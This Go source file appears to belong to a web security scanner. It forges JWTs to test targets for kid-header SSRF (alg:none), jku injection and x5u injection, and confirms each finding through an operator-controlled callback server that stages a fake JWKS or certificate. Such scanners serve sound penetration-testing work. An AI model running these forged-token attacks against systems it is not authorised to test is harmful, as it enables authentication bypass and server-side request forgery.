package jwtscan

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"
	"time"

	"github.com/Indigo6415/Aperture/internal/collaborator"
)

// OOBConfig is how RunScan reaches an operator-picked callback server (see
// internal/collaborator) for the kid-SSRF/jku/x5u tests in this file -- the
// only three tests in this package that need one; every other test works
// without it. The zero value (empty Token) just reports those three as
// skipped rather than failing the rest of the scan. Built entirely by
// handlers_jwt.go, mirroring how handlers_ssrf.go builds ssrf.OOBConfig.
type OOBConfig struct {
	Registry *collaborator.Registry
	// CallbackURL is the chosen server's full reachable address: this
	// Aperture instance's own scheme://host/collab/<token>, or webhook.site's
	// https://webhook.site/<uuid>.
	CallbackURL string
	// Token/Provider identify which server CallbackURL refers to -- needed
	// to poll it afterwards (Registry.Poll for "aperture",
	// collaborator.PollWebhookSite for "webhooksite") and, for jku/x5u, to
	// stage a response body under it (only possible for "aperture" --
	// webhook.site has no way to be told what to answer a request with).
	Token, Provider string
}

// oobGracePeriod mirrors internal/ssrf's own constant of the same name --
// pollOOB fetches whatever's been recorded against oob's token so far,
// via whichever provider it names -- a poll failure (webhook.site
// unreachable) is treated the same as "nothing yet" rather than an error,
// since these tests already have their own app-level signal (c.attempt's
// Hit) to fall back on.
func pollOOB(oob OOBConfig) []collaborator.Interaction {
	if oob.Provider == "webhooksite" {
		ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
		defer cancel()
		hits, err := collaborator.PollWebhookSite(ctx, oob.Token)
		if err != nil {
			return nil
		}
		return hits
	}
	if oob.Registry == nil {
		return nil
	}
	return oob.Registry.Poll(oob.Token)
}

// finalizeOOBResult settles res's Status/Summary once hits are known for
// identifier -- left untouched if a build/sign step already marked it
// StatusSkipped. Vulnerable on either signal (an out-of-band hit, or the
// app itself accepting the forged token), since either alone is a real
// finding even without the other.
func finalizeOOBResult(res *TestResult, identifier string, byIdentifier map[string][]collaborator.Interaction) {
	if res.Status == StatusSkipped {
		return
	}
	hits := byIdentifier[identifier]
	appAccepted := len(res.Attempts) > 0 && res.Attempts[0].Hit

	switch {
	case len(hits) > 0 && appAccepted:
		res.Status = StatusVulnerable
		res.Summary = fmt.Sprintf(
			"Server fetched the attacker-controlled address (%d inbound %s interaction(s)) and accepted the resulting forged token",
			len(hits), hits[0].Protocol,
		)
	case len(hits) > 0:
		res.Status = StatusVulnerable
		res.Summary = fmt.Sprintf(
			"Server fetched the attacker-controlled address (%d inbound %s interaction(s)) but did not end up accepting the forged token -- still a real SSRF primitive even without a full auth bypass",
			len(hits), hits[0].Protocol,
		)
	case appAccepted:
		res.Status = StatusVulnerable
		res.Summary = "Server accepted the forged token (no separate out-of-band callback observed, but the response itself confirms it)"
	default:
		res.Status = StatusSafe
		res.Summary = "No out-of-band callback observed and the forged token was rejected"
	}
}

// runOOBTests runs the kid-SSRF, jku-injection, and x5u-injection checks
// together, always in that order: each fires its own forged token against
// the target first (tagged with its own identifier), then -- since all
// three can share one operator-picked token the same way internal/ssrf's
// own shared-callback path lets many parameters share one -- there's a
// single oobGracePeriod wait and a single poll, with hits matched back to
// whichever test's identifier they carry.
//
//   - kid-SSRF sets the "kid" header to the callback address and signs
//     alg:none -- a naive "resolve kid into a key-lookup URL" implementation
//     fetches it well before ever getting to signature verification, so the
//     fetch itself is proof independent of whether the app ultimately
//     accepts the token.
//   - jku/x5u each need an RSA key pair and a document (a JWKS doc, an
//     X.509 cert chain) staged at the callback server for the target to
//     fetch and verify against -- only possible when oob.Provider is
//     Aperture's own listener (webhook.site can't be told what to answer a
//     request with), so both report StatusSkipped otherwise.
func runOOBTests(c *scanCtx, oob OOBConfig) []TestResult {
	kid := TestResult{ID: "kid_ssrf", Name: "kid Header SSRF"}
	jku := TestResult{ID: "jku_injection", Name: "jku Header Injection"}
	x5u := TestResult{ID: "x5u_injection", Name: "x5u Header Injection"}

	if oob.Token == "" {
		const summary = "No callback server selected -- toggle Callback above and pick (or mint) one to enable this test."
		kid.Status, kid.Summary = StatusSkipped, summary
		jku.Status, jku.Summary = StatusSkipped, summary
		x5u.Status, x5u.Summary = StatusSkipped, summary
		return []TestResult{kid, jku, x5u}
	}

	base := strings.TrimRight(oob.CallbackURL, "/")

	const kidIdentifier = "kid-ssrf"
	kidURL := base + "/" + kidIdentifier + "/"
	kidHeader := cloneMap(c.header)
	kidHeader["alg"] = "none"
	kidHeader["kid"] = kidURL
	if token, err := buildJWT(kidHeader, c.payload, nil); err != nil {
		kid.Status, kid.Summary = StatusSkipped, "Could not build forged token: "+err.Error()
	} else {
		a := c.attempt(fmt.Sprintf("kid=%q (alg:none)", kidURL), token)
		kid.Attempts, kid.Token = []Attempt{a}, token
	}

	// jku/x5u identifiers only end up non-empty when they actually got far
	// enough to fire an attempt -- finalizeOOBResult is skipped for either
	// one left at "" below.
	var jkuIdentifier, x5uIdentifier string

	if oob.Provider == "webhooksite" || oob.Registry == nil {
		const summary = "webhook.site can't be told what to answer a request with -- pick an Aperture callback server to enable this test."
		jku.Status, jku.Summary = StatusSkipped, summary
		x5u.Status, x5u.Summary = StatusSkipped, summary
	} else if priv, err := getRSAKeypair(); err != nil {
		jku.Status, jku.Summary = StatusSkipped, "Could not generate an RSA key pair: "+err.Error()
		x5u.Status, x5u.Summary = StatusSkipped, "Could not generate an RSA key pair: "+err.Error()
	} else {
		jkuIdentifier = "jku"
		if jwksBody, err := json.Marshal(map[string]any{"keys": []any{jwkFromPublicKey(&priv.PublicKey)}}); err != nil {
			jku.Status, jku.Summary = StatusSkipped, "Could not encode JWKS document: "+err.Error()
			jkuIdentifier = ""
		} else {
			// Staged under the bare "jwks.json" path, not
			// "<identifier>/jwks.json" -- handleCollaboratorCallback already
			// splits the identifier segment off before looking a staged
			// response up (see splitIdentifier), so by the time it checks
			// Staged(), the identifier is gone and only the path after it
			// remains.
			oob.Registry.Stage(oob.Token, "jwks.json", "application/json", jwksBody)
			jkuURL := base + "/" + jkuIdentifier + "/jwks.json"
			h := cloneMap(c.header)
			delete(h, "jwk")
			h["alg"], h["jku"] = "RS256", jkuURL
			if token, err := buildJWTRSA(h, c.payload, priv); err != nil {
				jku.Status, jku.Summary = StatusSkipped, "Could not sign forged token: "+err.Error()
				jkuIdentifier = ""
			} else {
				a := c.attempt(fmt.Sprintf("jku=%q (RS256)", jkuURL), token)
				jku.Attempts, jku.Token = []Attempt{a}, token
			}
		}

		x5uIdentifier = "x5u"
		if certPEM, err := selfSignedCertPEM(priv); err != nil {
			x5u.Status, x5u.Summary = StatusSkipped, "Could not build a self-signed certificate: "+err.Error()
			x5uIdentifier = ""
		} else {
			// Same "bare path, not identifier-prefixed" reasoning as jku's
			// own Stage call above.
			oob.Registry.Stage(oob.Token, "cert.pem", "application/x-pem-file", certPEM)
			x5uURL := base + "/" + x5uIdentifier + "/cert.pem"
			h := cloneMap(c.header)
			delete(h, "jwk")
			h["alg"], h["x5u"] = "RS256", x5uURL
			if token, err := buildJWTRSA(h, c.payload, priv); err != nil {
				x5u.Status, x5u.Summary = StatusSkipped, "Could not sign forged token: "+err.Error()
				x5uIdentifier = ""
			} else {
				a := c.attempt(fmt.Sprintf("x5u=%q (RS256)", x5uURL), token)
				x5u.Attempts, x5u.Token = []Attempt{a}, token
			}
		}
	}

	polled, _ := collaborator.WaitForCallbacks(context.Background(), func(c context.Context) ([]collaborator.Interaction, error) {
		return pollOOB(oob), nil
	}, collaborator.DefaultPollInterval, collaborator.DefaultQuietPeriod, collaborator.DefaultMaxWait)

	byIdentifier := map[string][]collaborator.Interaction{}
	for _, h := range polled {
		byIdentifier[h.Identifier] = append(byIdentifier[h.Identifier], h)
	}

	finalizeOOBResult(&kid, kidIdentifier, byIdentifier)
	if jkuIdentifier != "" {
		finalizeOOBResult(&jku, jkuIdentifier, byIdentifier)
	}
	if x5uIdentifier != "" {
		finalizeOOBResult(&x5u, x5uIdentifier, byIdentifier)
	}

	return []TestResult{kid, jku, x5u}
}
